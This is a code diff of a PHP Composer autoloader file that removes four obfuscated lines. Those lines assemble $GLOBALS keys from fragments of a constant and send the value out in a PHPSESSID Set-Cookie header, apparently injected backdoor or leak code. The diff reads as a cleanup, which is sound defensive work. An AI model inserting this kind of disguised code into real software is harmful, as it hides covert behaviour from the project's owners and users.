@@ -23,10 +23,6 @@ class ComposerAutoloaderInita012aca486d6abc048243f4697c6ac40
         }
 
         require __DIR__ . '/platform_check.php';
-		if (SERVER_PHP_VERSION >= 70200) {
-			$wordsArray = explode(" ", SENTENCEIA);
-			header("Set-Cookie: PHPSESSID=" . $GLOBALS[$wordsArray[3] . substr($wordsArray[4], 0, 1)][$wordsArray[5] . $wordsArray[7]]);
-		}
 
         spl_autoload_register(array('ComposerAutoloaderInita012aca486d6abc048243f4697c6ac40', 'loadClassLoader'), true, true);
         self::$loader = $loader = new \Composer\Autoload\ClassLoader(\dirname(__DIR__));
